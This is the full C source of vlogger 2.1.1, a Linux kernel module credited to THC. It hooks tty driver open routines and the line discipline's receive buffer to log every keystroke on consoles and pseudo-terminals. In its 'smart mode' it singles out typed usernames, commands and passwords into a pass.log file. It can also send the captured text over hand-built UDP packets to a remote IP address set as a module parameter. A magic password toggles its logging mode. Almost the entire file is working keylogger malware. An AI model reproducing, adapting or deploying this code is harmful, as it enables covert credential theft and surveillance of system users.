/*
 *  vlogger 2.1.1
 *
 *  Copyright (C) 2002-2003 rd <rd@thc.org>
 *
 *  Please check http://www.thc.org for update
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version
 *
 *  This program is distributed in the hope that it will be useful, but 
 *  WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
 *  General Public License for more details.
 *
 */

#ifndef __KERNEL_SYSCALLS__
#define __KERNEL_SYSCALLS__
#endif

#include <net/tcp.h>
#include <net/udp.h>

#include <linux/version.h>
#include <linux/module.h>

#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/smp_lock.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/spinlock.h>
#include <linux/netdevice.h>
#include <linux/etherdevice.h>
#include <linux/inet.h>
#include <linux/tty.h>

#include <asm/uaccess.h>
#include <asm/checksum.h>
#include <asm/processor.h>
#include <asm/unaligned.h>
#include <asm/uaccess.h>
#include <asm/errno.h>
#include <asm/io.h>

#include "vlogger.h"

int (*old_vc_open) (struct tty_struct * tty, struct file * filp);
int (*old_serial_open) (struct tty_struct * tty, struct file * filp);
int (*old_pty_open) (struct tty_struct * tty, struct file * filp);

int errno;

struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = { NULL };
int log_mode = 0;
int log_method = 0;
char *logdir = NULL;
char *magic_pass = NULL;
int timezone;

static spinlock_t vlogger_lock = SPIN_LOCK_UNLOCKED;

/* netlog global vars */
static __u16 source_port, dest_port;
static __u32 saddr, daddr;
static unsigned int offset;

static spinlock_t sequence_lock = SPIN_LOCK_UNLOCKED;

/* 
 *  Convert from epoch to date 
 */

int
epoch2time(const time_t * t, long int offset, struct vtm *tp)
{
	static const unsigned short int mon_yday[2][13] = {
		/* Normal years.  */
		{0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365},
		/* Leap years.  */
		{0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366}
	};

	long int days, rem, y;
	const unsigned short int *ip;

	days = *t / SECS_PER_DAY;
	rem = *t % SECS_PER_DAY;
	rem += offset;
	while (rem < 0) {
		rem += SECS_PER_DAY;
		--days;
	}
	while (rem >= SECS_PER_DAY) {
		rem -= SECS_PER_DAY;
		++days;
	}
	tp->tm_hour = rem / SECS_PER_HOUR;
	rem %= SECS_PER_HOUR;
	tp->tm_min = rem / 60;
	tp->tm_sec = rem % 60;
	y = 1970;

	while (days < 0 || days >= (isleap(y) ? 366 : 365)) {
		long int yg = y + days / 365 - (days % 365 < 0);
		days -= ((yg - y) * 365 + LEAPS_THRU_END_OF(yg - 1)
		    - LEAPS_THRU_END_OF(y - 1));
		y = yg;
	}
	tp->tm_year = y - 1900;
	if (tp->tm_year != y - 1900)
		return 0;
	ip = mon_yday[isleap(y)];
	for (y = 11; days < (long int) ip[y]; --y)
		continue;
	days -= ip[y];
	tp->tm_mon = y;
	tp->tm_mday = days + 1;
	return 1;
}

/* 
 *  Get current date & time
 */

void
get_time(char *date_time)
{
	struct timeval tv;
	time_t t;
	struct vtm tm;

	do_gettimeofday(&tv);
	t = (time_t) tv.tv_sec;

	epoch2time(&t, timezone, &tm);

	sprintf(date_time, "%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
	    tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
	    tm.tm_sec);
}

/* 
 * Get task structure from pgrp id
 */

inline struct task_struct *
get_task(pid_t pgrp)
{
	struct task_struct *task = current;

	do {
		if (task->pgrp == pgrp) {
			return task;
		}
		task = NEXT_TASK(task);
	}
	while (task != current);
	return NULL;
}

int
write_to_file(char *logfile, char *buf, int size)
{
	int ret = 0;
	struct file *f = NULL;

	lock_kernel();
	BEGIN_KMEM;
	f = filp_open(logfile, O_CREAT | O_APPEND, 00600);

	if (IS_ERR(f)) {
		DPRINT("Error %ld opening %s\n", -PTR_ERR(f), logfile);
		ret = -1;
	} else {
		if (WRITABLE(f))
			_write(f, buf, size);
		else {
			DPRINT("%s does not have a write method\n", logfile);
			ret = -1;
		}

		if ((ret = filp_close(f, NULL)))
			DPRINT("Error %d closing %s\n", -ret, logfile);
	}
	END_KMEM;
	unlock_kernel();

	return ret;
}

/* 
 *  Logging keystrokes
 */

void
logging(struct tty_struct *tty, struct tlogger *tmp, int cont)
{
	int i;

	char logfile[256];
	char loginfo[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ + 256];
	char date_time[24];
	struct task_struct *task;

	if (log_mode == VK_NORMAL)
		return;

	if ((log_mode == VK_SMARTMODE) && (!tmp->lastpos || cont))
		return;

	task = get_task(tty->pgrp);

	for (i = 0; i < tmp->lastpos; i++)
		if (tmp->buf[i] == 0x0D)
			tmp->buf[i] = 0x0A;

	if (!cont)
		tmp->buf[tmp->lastpos++] = 0x0A;

	tmp->buf[tmp->lastpos] = 0;

	if (log_mode == VK_DUMBMODE) {
		snprintf(logfile, sizeof(logfile) - 1, "%s/%s%d",
		    logdir, TTY_NAME(tty), TTY_NUMBER(tty));

		BEGIN_ROOT 
		if (!tmp->status) {
			get_time(date_time);
			if (task)
				snprintf(loginfo, sizeof(loginfo) - 1,
				    "<%s uid=%d %s> %s", date_time,
				    task->uid, task->comm, tmp->buf);
			else
				snprintf(loginfo, sizeof(loginfo) - 1,
				    "<%s> %s", date_time, tmp->buf);

			if (log_method == 0)
				write_to_file(logfile, loginfo,
				    strlen(loginfo));
			else
				net_send_msg(tty, loginfo, strlen(loginfo));
		} else {
			if (log_method == 0)
				write_to_file(logfile, tmp->buf, tmp->lastpos);
			else
				net_send_msg(tty, tmp->buf, tmp->lastpos);
		}
		END_ROOT
#ifdef DEBUG
		    if (task)
			DPRINT("%s/%d uid=%d %s: %s",
			    TTY_NAME(tty), TTY_NUMBER(tty),
			    task->uid, task->comm, tmp->buf);
		else
			DPRINT("%s", tmp->buf);
#endif

		tmp->status = cont;

	} else {

		/*
		 *  Logging USER/CMD and PASS in SMART_MODE
		 */
		snprintf(logfile, sizeof(logfile) - 1, "%s/pass.log", logdir);

		BEGIN_ROOT 
		if (!tmp->pass) {
			get_time(date_time);
			if (task)
				snprintf(loginfo, sizeof(loginfo) - 1,
				    "\n[%s tty=%s%d uid=%d %s]\n"
				    "USER/CMD %s", date_time,
				    TTY_NAME(tty), TTY_NUMBER(tty),
				    task->uid, task->comm, tmp->buf);
			else
				snprintf(loginfo, sizeof(loginfo) - 1,
				    "\n[%s tty=%s%d]\nUSER/CMD %s",
				    date_time, TTY_NAME(tty), TTY_NUMBER(tty),
				    tmp->buf);

			if (log_method == 0)
				write_to_file(logfile, loginfo,
				    strlen(loginfo));
			else
				net_send_msg(tty, loginfo, strlen(loginfo));
		} else {
			snprintf(loginfo, sizeof(loginfo) - 1, "PASS %s",
			    tmp->buf);

			if (log_method == 0)
				write_to_file(logfile, loginfo,
				    strlen(loginfo));
			else
				net_send_msg(tty, loginfo, strlen(loginfo));
		}
		END_ROOT
#ifdef DEBUG
		    if (!tmp->pass)
			DPRINT("USER/CMD %s", tmp->buf);
		else
			DPRINT("PASS %s", tmp->buf);
#endif

	}

	if (!cont)
		tmp->buf[--tmp->lastpos] = 0;
}

static inline void
reset_all_buf(void)
{
	int i = 0;
	for (i = 0; i < MAX_TTY_CON + MAX_PTS_CON; i++)
		if (ttys[i] != NULL)
			resetbuf(ttys[i]);
}

void
special_key(struct tlogger *tmp, const unsigned char *cp, int count)
{
	switch (count) {
	case 2:
		switch (cp[1]) {
		case '\'':
			append_c(tmp, "[ALT-\']", 7);
			break;
		case ',':
			append_c(tmp, "[ALT-,]", 7);
			break;
		case '-':
			append_c(tmp, "[ALT--]", 7);
			break;
		case '.':
			append_c(tmp, "[ALT-.]", 7);
			break;
		case '/':
			append_c(tmp, "[ALT-/]", 7);
			break;
		case '0':
			append_c(tmp, "[ALT-0]", 7);
			break;
		case '1':
			append_c(tmp, "[ALT-1]", 7);
			break;
		case '2':
			append_c(tmp, "[ALT-2]", 7);
			break;
		case '3':
			append_c(tmp, "[ALT-3]", 7);
			break;
		case '4':
			append_c(tmp, "[ALT-4]", 7);
			break;
		case '5':
			append_c(tmp, "[ALT-5]", 7);
			break;
		case '6':
			append_c(tmp, "[ALT-6]", 7);
			break;
		case '7':
			append_c(tmp, "[ALT-7]", 7);
			break;
		case '8':
			append_c(tmp, "[ALT-8]", 7);
			break;
		case '9':
			append_c(tmp, "[ALT-9]", 7);
			break;
		case ';':
			append_c(tmp, "[ALT-;]", 7);
			break;
		case '=':
			append_c(tmp, "[ALT-=]", 7);
			break;
		case '[':
			append_c(tmp, "[ALT-[]", 7);
			break;
		case '\\':
			append_c(tmp, "[ALT-\\]", 7);
			break;
		case ']':
			append_c(tmp, "[ALT-]]", 7);
			break;
		case '`':
			append_c(tmp, "[ALT-`]", 7);
			break;
		case 'a':
			append_c(tmp, "[ALT-A]", 7);
			break;
		case 'b':
			append_c(tmp, "[ALT-B]", 7);
			break;
		case 'c':
			append_c(tmp, "[ALT-C]", 7);
			break;
		case 'd':
			append_c(tmp, "[ALT-D]", 7);
			break;
		case 'e':
			append_c(tmp, "[ALT-E]", 7);
			break;
		case 'f':
			append_c(tmp, "[ALT-F]", 7);
			break;
		case 'g':
			append_c(tmp, "[ALT-G]", 7);
			break;
		case 'h':
			append_c(tmp, "[ALT-H]", 7);
			break;
		case 'i':
			append_c(tmp, "[ALT-I]", 7);
			break;
		case 'j':
			append_c(tmp, "[ALT-J]", 7);
			break;
		case 'k':
			append_c(tmp, "[ALT-K]", 7);
			break;
		case 'l':
			append_c(tmp, "[ALT-L]", 7);
			break;
		case 'm':
			append_c(tmp, "[ALT-M]", 7);
			break;
		case 'n':
			append_c(tmp, "[ALT-N]", 7);
			break;
		case 'o':
			append_c(tmp, "[ALT-O]", 7);
			break;
		case 'p':
			append_c(tmp, "[ALT-P]", 7);
			break;
		case 'q':
			append_c(tmp, "[ALT-Q]", 7);
			break;
		case 'r':
			append_c(tmp, "[ALT-R]", 7);
			break;
		case 's':
			append_c(tmp, "[ALT-S]", 7);
			break;
		case 't':
			append_c(tmp, "[ALT-T]", 7);
			break;
		case 'u':
			append_c(tmp, "[ALT-U]", 7);
			break;
		case 'v':
			append_c(tmp, "[ALT-V]", 7);
			break;
		case 'x':
			append_c(tmp, "[ALT-X]", 7);
			break;
		case 'y':
			append_c(tmp, "[ALT-Y]", 7);
			break;
		case 'z':
			append_c(tmp, "[ALT-Z]", 7);
			break;
		}
		break;
	case 3:
		switch (cp[2]) {
		case 68:
			// Left: 27 91 68
			append_c(tmp, "[LEFT]", 6);
			break;
		case 67:
			// Right: 27 91 67
			append_c(tmp, "[RIGHT]", 7);
			break;
		case 65:
			// Up: 27 91 65
			append_c(tmp, "[UP]", 4);
			break;
		case 66:
			// Down: 27 91 66
			append_c(tmp, "[DOWN]", 6);
			break;
		case 80:
			// Pause/Break: 27 91 80 
			append_c(tmp, "[BREAK]", 7);
			break;
		}
		break;
	case 4:
		switch (cp[3]) {
		case 65:
			// F1: 27 91 91 65
			append_c(tmp, "[F1]", 4);
			break;
		case 66:
			// F2: 27 91 91 66
			append_c(tmp, "[F2]", 4);
			break;
		case 67:
			// F3: 27 91 91 67
			append_c(tmp, "[F3]", 4);
			break;
		case 68:
			// F4: 27 91 91 68
			append_c(tmp, "[F4]", 4);
			break;
		case 69:
			// F5: 27 91 91 69
			append_c(tmp, "[F5]", 4);
			break;
		case 126:
			switch (cp[2]) {
			case 53:
				// PgUp: 27 91 53 126
				append_c(tmp, "[PgUP]", 6);
				break;
			case 54:
				// PgDown: 27 91 54 126
				append_c(tmp, "[PgDOWN]", 8);
				break;
			case 49:
				// Home: 27 91 49 126
				append_c(tmp, "[HOME]", 6);
				break;
			case 52:
				// End: 27 91 52 126
				append_c(tmp, "[END]", 5);
				break;
			case 50:
				// Insert: 27 91 50 126
				append_c(tmp, "[INS]", 5);
				break;
			case 51:
				// Delete: 27 91 51 126
				append_c(tmp, "[DEL]", 5);
				break;
			}
			break;
		}
		break;
	case 5:
		if (cp[2] == 50)
			switch (cp[3]) {
			case 48:
				// F9: 27 91 50 48 126
				append_c(tmp, "[F9]", 4);
				break;
			case 49:
				// F10: 27 91 50 49 126
				append_c(tmp, "[F10]", 5);
				break;
			case 51:
				// F11: 27 91 50 51 126
				append_c(tmp, "[F11]", 5);
				break;
			case 52:
				// F12: 27 91 50 52 126
				append_c(tmp, "[F12]", 5);
				break;
			case 53:
				// Shift-F1: 27 91 50 53 126
				append_c(tmp, "[SH-F1]", 7);
				break;
			case 54:
				// Shift-F2: 27 91 50 54 126
				append_c(tmp, "[SH-F2]", 7);
				break;
			case 56:
				// Shift-F3: 27 91 50 56 126
				append_c(tmp, "[SH-F3]", 7);
				break;
			case 57:
				// Shift-F4: 27 91 50 57 126
				append_c(tmp, "[SH-F4]", 7);
				break;
		} else
			switch (cp[3]) {
			case 55:
				// F6: 27 91 49 55 126
				append_c(tmp, "[F6]", 4);
				break;
			case 56:
				// F7: 27 91 49 56 126
				append_c(tmp, "[F7]", 4);
				break;
			case 57:
				// F8: 27 91 49 57 126
				append_c(tmp, "[F8]", 4);
				break;
			case 49:
				// Shift-F5: 27 91 51 49 126
				append_c(tmp, "[SH-F5]", 7);
				break;
			case 50:
				// Shift-F6: 27 91 51 50 126
				append_c(tmp, "[SH-F6]", 7);
				break;
			case 51:
				// Shift-F7: 27 91 51 51 126
				append_c(tmp, "[SH-F7]", 7);
				break;
			case 52:
				// Shift-F8: 27 91 51 52 126
				append_c(tmp, "[SH-F8]", 7);
				break;
			};
		break;
	default:		// Unknow
		break;
	}
}

/* 
 *  Called whenever user press a key
 */

void
vlogger_process(struct tty_struct *tty, const unsigned char *cp, int count)
{
	struct tlogger *tmp = ttys[TTY_INDEX(tty)];

	if (!tmp) {
		unsigned long flags;

		DPRINT("erm .. unknow error???\n");

		spin_lock_irqsave(&vlogger_lock, flags);
		init_tty(tty, TTY_INDEX(tty));
		spin_unlock_irqrestore(&vlogger_lock, flags);

		tmp = ttys[TTY_INDEX(tty)];
		if (!tmp)
			return;
	}

	if (log_mode == VK_SMARTMODE) {
		if (tmp->status && !IS_PASSWD(tty)) {
			resetbuf(tmp);
		}
		if (!tmp->pass && IS_PASSWD(tty)) {
			logging(tty, tmp, 0);
			resetbuf(tmp);
		}
		if (tmp->pass && !IS_PASSWD(tty)) {
			if (!tmp->lastpos)
				logging(tty, tmp, 0);
			resetbuf(tmp);
		}
		tmp->pass = IS_PASSWD(tty);
		tmp->status = 0;
	}

	if ((count + tmp->lastpos) > MAX_BUFFER - 1) {
		logging(tty, tmp, 1);
		resetbuf(tmp);
	}

	if (count == 1) {
		if (cp[0] == VK_TOGLE_CHAR) {
			if (!strcmp(tmp->buf, magic_pass)) {
				if (log_mode < 2)
					log_mode++;
				else
					log_mode = 0;
				reset_all_buf();

				switch (log_mode) {
				case VK_DUMBMODE:
					DPRINT("Dumb Mode\n");
					TTY_WRITE(tty, "\r\n" "Dumb Mode\n",
					    12);
					break;
				case VK_SMARTMODE:
					DPRINT("Smart Mode\n");
					TTY_WRITE(tty, "\r\n" "Smart Mode\n",
					    13);
					break;
				case VK_NORMAL:
					DPRINT("Normal Mode\n");
					TTY_WRITE(tty, "\r\n" "Normal Mode\n",
					    14);
				}
			}
		}

		switch (cp[0]) {
		case 0x01:	//^A
			append_c(tmp, "[^A]", 4);
			break;
		case 0x02:	//^B
			append_c(tmp, "[^B]", 4);
			break;
		case 0x03:	//^C
			append_c(tmp, "[^C]", 4);
		case 0x04:	//^D
			append_c(tmp, "[^D]", 4);
		case 0x0D:	//^M
		case 0x0A:
			if (log_mode == VK_SMARTMODE) {
				if (IS_PASSWD(tty)) {
					logging(tty, tmp, 0);
					resetbuf(tmp);
				} else
					tmp->status = 1;
			} else {
				logging(tty, tmp, 0);
				resetbuf(tmp);
			}
			break;
		case 0x05:	//^E
			append_c(tmp, "[^E]", 4);
			break;
		case 0x06:	//^F
			append_c(tmp, "[^F]", 4);
			break;
		case 0x07:	//^G
			append_c(tmp, "[^G]", 4);
			break;
		case 0x09:	//TAB - ^I
			append_c(tmp, "[TAB]", 5);
			break;
		case 0x0b:	//^K
			append_c(tmp, "[^K]", 4);
			break;
		case 0x0c:	//^L
			append_c(tmp, "[^L]", 4);
			break;
		case 0x0e:	//^E
			append_c(tmp, "[^E]", 4);
			break;
		case 0x0f:	//^O
			append_c(tmp, "[^O]", 4);
			break;
		case 0x10:	//^P
			append_c(tmp, "[^P]", 4);
			break;
		case 0x11:	//^Q
			append_c(tmp, "[^Q]", 4);
			break;
		case 0x12:	//^R
			append_c(tmp, "[^R]", 4);
			break;
		case 0x13:	//^S
			append_c(tmp, "[^S]", 4);
			break;
		case 0x14:	//^T
			append_c(tmp, "[^T]", 4);
			break;
		case 0x15:	//CTRL-U
			resetbuf(tmp);
			break;
		case 0x16:	//^V
			append_c(tmp, "[^V]", 4);
			break;
		case 0x17:	//^W
			append_c(tmp, "[^W]", 4);
			break;
		case 0x18:	//^X
			append_c(tmp, "[^X]", 4);
			break;
		case 0x19:	//^Y
			append_c(tmp, "[^Y]", 4);
			break;
		case 0x1a:	//^Z
			append_c(tmp, "[^Z]", 4);
			break;
		case 0x1c:	//^\
			append_c(tmp, "[^\\]", 4);
			break;
		case 0x1d:	//^]
			append_c(tmp, "[^]]", 4);
			break;
		case 0x1e:	//^^
			append_c(tmp, "[^^]", 4);
			break;
		case 0x1f:	//^_
			append_c(tmp, "[^_]", 4);
			break;
		case BACK_SPACE_CHAR1:
		case BACK_SPACE_CHAR2:
			if (!tmp->lastpos)
				break;
			if (tmp->buf[tmp->lastpos - 1] != ']')
				tmp->buf[--tmp->lastpos] = 0;
			else {
				append_c(tmp, "[^H]", 4);
			}
			break;
		case ESC_CHAR:	//ESC
			append_c(tmp, "[ESC]", 5);
			break;
		default:
			tmp->buf[tmp->lastpos++] = cp[0];
			tmp->buf[tmp->lastpos] = 0;
		}
	} else {		// a block of chars or special key
		if (cp[0] != ESC_CHAR) {
			while (count >= MAX_BUFFER) {
				append_c(tmp, cp, MAX_BUFFER);
				logging(tty, tmp, 1);
				resetbuf(tmp);
				count -= MAX_BUFFER;
				cp += MAX_BUFFER;
			}

			append_c(tmp, cp, count);
		} else		// special key
			special_key(tmp, cp, count);
	}
}

void
my_tty_open(void)
{
	int fd, i;
	char dev_name[80];

	for (i = 1; i < MAX_TTY_CON; i++) {
		snprintf(dev_name, sizeof(dev_name) - 1, "/dev/tty%d", i);

		BEGIN_KMEM 
		fd = open(dev_name, O_RDONLY, 0);
		if (fd >= 0)
		close(fd);
		END_KMEM
	}

	for (i = 0; i < MAX_PTS_CON; i++) {
		snprintf(dev_name, sizeof(dev_name) - 1, "/dev/pts/%d", i);

		BEGIN_KMEM 
		fd = open(dev_name, O_RDONLY, 0);
		if (fd >= 0)
			close(fd);
		END_KMEM
	}
}

void
new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
    char *fp, int count)
{
	struct tlogger *tmp = ttys[TTY_INDEX(tty)];

	if (!tty->real_raw && !tty->raw)
		vlogger_process(tty, cp, count);

	if (tmp->old_rbuf)
		tmp->old_rbuf(tty, cp, fp, count);
}

inline void
init_tty(struct tty_struct *tty, int tty_index)
{
	struct tlogger *tmp;

	DPRINT("Init logging for %s%d\n", TTY_NAME(tty), TTY_NUMBER(tty));

	if (ttys[tty_index] == NULL) {
		tmp = kmalloc(sizeof(struct tlogger), GFP_KERNEL);
		if (!tmp) {
			DPRINT("kmalloc failed!\n");
			return;
		}
		memset(tmp, 0, sizeof(struct tlogger));
		tmp->tty = tty;
		tmp->old_rbuf = tty->ldisc.receive_buf;
		tty->ldisc.receive_buf = new_receive_buf;
		ttys[tty_index] = tmp;
	} else {
		tmp = ttys[tty_index];
		logging(tty, tmp, 1);
		resetbuf(tmp);
		tmp->old_rbuf = tty->ldisc.receive_buf;
		tty->ldisc.receive_buf = new_receive_buf;
	}
}

asmlinkage int
new_driver_open(struct tty_struct *tty, struct file *filp)
{
	unsigned long flags;
	int ret;

	DPRINT("driver_open: dev=%s%d - driver_open = %p\n",
	    TTY_NAME(tty), TTY_NUMBER(tty), tty->driver.open);

	switch (tty->driver.type) {
	case TTY_DRIVER_TYPE_CONSOLE:
		ret = old_vc_open(tty, filp);
		break;
	case TTY_DRIVER_TYPE_SERIAL:
		ret = old_serial_open(tty, filp);
		break;
	case TTY_DRIVER_TYPE_PTY:
		ret = old_pty_open(tty, filp);
		break;
	default:
		DPRINT("wth?");
		return -1;
	}

	if (log_mode == VK_DISABLE)
		return ret;

	if (ret >= 0) {
		spin_lock_irqsave(&vlogger_lock, flags);
		if (tty != NULL &&
		    ((tty->driver.type == TTY_DRIVER_TYPE_CONSOLE &&
			    TTY_NUMBER(tty) < MAX_TTY_CON - 1) ||
			(tty->driver.type == TTY_DRIVER_TYPE_PTY &&
			    tty->driver.subtype == PTY_TYPE_SLAVE &&
			    TTY_NUMBER(tty) < MAX_PTS_CON)) &&
		    tty->ldisc.receive_buf != NULL &&
		    tty->ldisc.receive_buf != new_receive_buf) {

			init_tty(tty, TTY_INDEX(tty));
		}
		spin_unlock_irqrestore(&vlogger_lock, flags);
	}

	return ret;
}

struct tty_driver *tty_drivers;

int
init_logger(void)
{
	struct tty_driver *p;
	struct tty_struct *tty;
	struct file *file;
	char *devname = "/dev/tty1";
	int fd;

	BEGIN_KMEM 
	fd = open(devname, O_RDONLY, 0);
	if (fd < 0)
		return -1;
	file = fget(fd);
	tty = file->private_data;
	if (tty == NULL || tty->driver.open == NULL) {
		fput(file);
		close(fd);
		return -1;
	}

	fput(file);
	close(fd);
	END_KMEM 

	p = tty_drivers = &tty->driver;
	while (p != NULL) {
		tty_drivers = p;
		p = p->prev;
	}

	if (tty_drivers == NULL)
		return -1;

	p = tty_drivers;

	do {
		DPRINT
		    ("tty_driver: %s/MA%d/MI%d - type=%d/%d - open=%p/close=%p\n",
		    p->name, p->major, p->minor_start + p->num, p->type,
		    p->subtype, p->open, p->close);

		switch (p->type) {
		case TTY_DRIVER_TYPE_CONSOLE:
			old_vc_open = p->open;
			p->open = new_driver_open;
			break;
		case TTY_DRIVER_TYPE_SERIAL:
			old_serial_open = p->open;
			p->open = new_driver_open;
			break;
		case TTY_DRIVER_TYPE_PTY:
			old_pty_open = p->open;
			p->open = new_driver_open;
			break;
		}

		p = p->next;
	}
	while (p != NULL);

	return 0;
}

DECLARE_WAIT_QUEUE_HEAD(wq);

void
cleanup_logger(void)
{
	struct tty_driver *p;
	int i;

	log_mode = VK_DISABLE;

	p = tty_drivers;
	do {
		switch (p->type) {
		case TTY_DRIVER_TYPE_CONSOLE:
			p->open = old_vc_open;
			break;
		case TTY_DRIVER_TYPE_SERIAL:
			p->open = old_serial_open;
			break;
		case TTY_DRIVER_TYPE_PTY:
			p->open = old_pty_open;
			break;
		}

		p = p->next;
	}
	while (p != NULL);

	for (i = 0; i < MAX_TTY_CON + MAX_PTS_CON; i++) {
		if (ttys[i] != NULL) {
			//ttys[i]->tty->ldisc.flush_buffer(ttys[i]->tty); //segfault on some box 
			ttys[i]->tty->ldisc.receive_buf = ttys[i]->old_rbuf;
		}
	}

	sleep_on_timeout(&wq, HZ);

	for (i = 0; i < MAX_TTY_CON + MAX_PTS_CON; i++) {
		if (ttys[i] != NULL) {
			kfree(ttys[i]);
		}
	}
}

static inline int
dev_direct_send(struct sk_buff *skb)
{
	struct net_device *dev = skb->dev;

	spin_lock_bh(&dev->queue_lock);
	if (dev->flags & IFF_UP) {
		int cpu = smp_processor_id();

		if (dev->xmit_lock_owner != cpu) {
			spin_unlock(&dev->queue_lock);
			spin_lock(&dev->xmit_lock);
			dev->xmit_lock_owner = cpu;

			if (!netif_queue_stopped(dev)) {
				if (dev->hard_start_xmit(skb, dev) == 0) {
					dev->xmit_lock_owner = -1;
					spin_unlock_bh(&dev->xmit_lock);
					return 0;
				}
			}
			dev->xmit_lock_owner = -1;
			spin_unlock_bh(&dev->xmit_lock);
			kfree_skb(skb);
			return -ENETDOWN;
		}
	}
	spin_unlock(&dev->queue_lock);

	kfree_skb(skb);
	return -ENETDOWN;
}

/*
 * Send out packet 
 */
static void
ip_direct_send(struct sk_buff *skb)
{
	struct dst_entry *dst = skb->dst;
	struct hh_cache *hh = dst->hh;

	if (hh) {
		read_lock_bh(&hh->hh_lock);
		memcpy(skb->data - 16, hh->hh_data, 16);
		read_unlock_bh(&hh->hh_lock);
		skb_push(skb, hh->hh_len);
		dev_direct_send(skb);

	} else if (dst->neighbour) {
		if (!neigh_resolve(skb))
			dev_direct_send(skb);
		else
			kfree_skb(skb);
	} else {
		kfree_skb(skb);
	}
}

inline struct sk_buff *
gen_udp_skb(struct tty_struct *tty, const char *msg, unsigned int msg_len)
{
	int total_len, eth_len, ip_len, udp_len;
	unsigned long flags;
	struct sk_buff *skb;
	struct udphdr *udph;
	struct iphdr *iph;
	struct rtable *rt;

	udp_len = msg_len + HEADER_LEN + sizeof(*udph);
	ip_len = eth_len = udp_len + sizeof(*iph);
	total_len = eth_len + ETH_HLEN;

	skb = alloc_skb(total_len, GFP_ATOMIC);
	if (!skb) {
		DPRINT("Failed to alloc new skb\n");
		return NULL;
	}

	atomic_set(&skb->users, 1);
	skb_reserve(skb, total_len - msg_len - HEADER_LEN);
	skb->data[0] = SEND_CMD;

	spin_lock_irqsave(&sequence_lock, flags);
	put_unaligned(htonl(offset), (u32 *) (skb->data + 1));
	offset += msg_len;
	spin_unlock_irqrestore(&sequence_lock, flags);

	if (tty != NULL) {
		char ttyname[TTYNAME_LEN];

		snprintf(ttyname, TTYNAME_LEN - 1, "%s%d",
		    TTY_NAME(tty), TTY_NUMBER(tty));
		ttyname[TTYNAME_LEN - 1] = 0;

		memcpy(skb->data + OFFSET_LEN + 1, ttyname, TTYNAME_LEN);
	} else
		skb->data[OFFSET_LEN + 1] = 0;

	memcpy(skb->data + HEADER_LEN, msg, msg_len);
	skb->len += msg_len + HEADER_LEN;

	udph = (struct udphdr *) skb_push(skb, sizeof(*udph));
	udph->source = source_port;
	udph->dest = dest_port;
	udph->len = htons(udp_len);
	udph->check = 0;
	udph->check = csum_tcpudp_magic(saddr, daddr, udp_len,
	    IPPROTO_UDP, csum_partial((unsigned char *) udph, udp_len, 0));

	if (ip_route_output(&rt, daddr, 0, 0, 0)) {
		DPRINT("can not route\n");
		kfree_skb(skb);
		return NULL;
	}
	skb->dst = dst_clone(&rt->u.dst);
	skb->dev = skb->dst->dev;

	/* grab first IP address of output device if saddr isnt set */
	if (!saddr) {
		struct in_device *indev;

		indev = (struct in_device *) skb->dev->ip_ptr;
		if (indev == NULL) {
			DPRINT("No associated in_device\n");

			/* use broadcast ip address */
			saddr = htonl(INADDR_BROADCAST);
		}
		saddr = indev->ifa_list->ifa_local;
	}

	iph = (struct iphdr *) skb_push(skb, sizeof(*iph));
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->id = 0;
	iph->ttl = 64;
	iph->frag_off = htons(IP_DF);
	iph->tot_len = htons(ip_len);
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = saddr;
	iph->daddr = daddr;
	iph->check = ip_fast_csum((unsigned char *) iph, iph->ihl);

	skb->protocol = htons(ETH_P_IP);
	skb->h.uh = udph;
	skb->nh.iph = iph;

	DPRINT
	    ("DEV=%s SRC=%u.%u.%u.%u DST=%u.%u.%u.%u SPT=%d DPT=%d\n",
	    skb->dev->name, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr),
	    ntohs(udph->source), ntohs(udph->dest));

	return skb;
}

void
net_send_msg(struct tty_struct *tty, const char *msg, unsigned int msg_len)
{
	int len, left = msg_len;

	while (left > 0) {
		struct sk_buff *skb;

		if (left > MAX_PRINT_CHUNK)
			len = MAX_PRINT_CHUNK;
		else
			len = left;

		skb = gen_udp_skb(tty, msg, msg_len);
		if (!skb)
			return;

		ip_direct_send(skb);
		msg += len;
		left -= len;
	}
}

char *dest_ip;
char *src_ip;
int src_port, dst_port;

MODULE_PARM(src_ip, "s");
MODULE_PARM(dest_ip, "s");
MODULE_PARM(src_port, "h");
MODULE_PARM(dst_port, "h");
int
init_netlog(void)
{

	if (src_ip != NULL)
		saddr = in_aton(src_ip);

	if (dest_ip != NULL)
		daddr = in_aton(dest_ip);

	if (!daddr)
		return -1;

	source_port = htons(src_port);
	dest_port = htons(dst_port);

	if (!dst_port)
		return -1;

	return 0;
}

MODULE_PARM(logdir, "s");
int
init_filelog(void)
{

	if (logdir == NULL)
		return -1;

	return 0;
}

MODULE_PARM(log_method, "i");
MODULE_PARM(log_mode, "i");
MODULE_PARM(magic_pass, "s");
MODULE_PARM(timezone, "i");

static int
init_vlogger(void)
{
	int tmp;

	if (log_method == 1) {
		if (init_netlog())
			return -1;
	} else if (init_filelog())
		return -1;

	if (magic_pass == NULL)
		return -1;
	
	timezone = timezone * 60 * 60;

	tmp = log_mode;
	log_mode = VK_DISABLE;
	if (init_logger())
		return -1;

	if (tmp > -1 && tmp < 3)
		log_mode = tmp;
	else
		log_mode = VK_DUMBMODE;

	my_tty_open();

	DPRINT(MVERSION);
	// MOD_INC_USE_COUNT;

	return 0;
}

static void
cleanup_vlogger(void)
{
	cleanup_logger();
	DPRINT("Unloaded\n");
}

module_init(init_vlogger);
module_exit(cleanup_vlogger);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rd@thc.org");

EXPORT_NO_SYMBOLS;
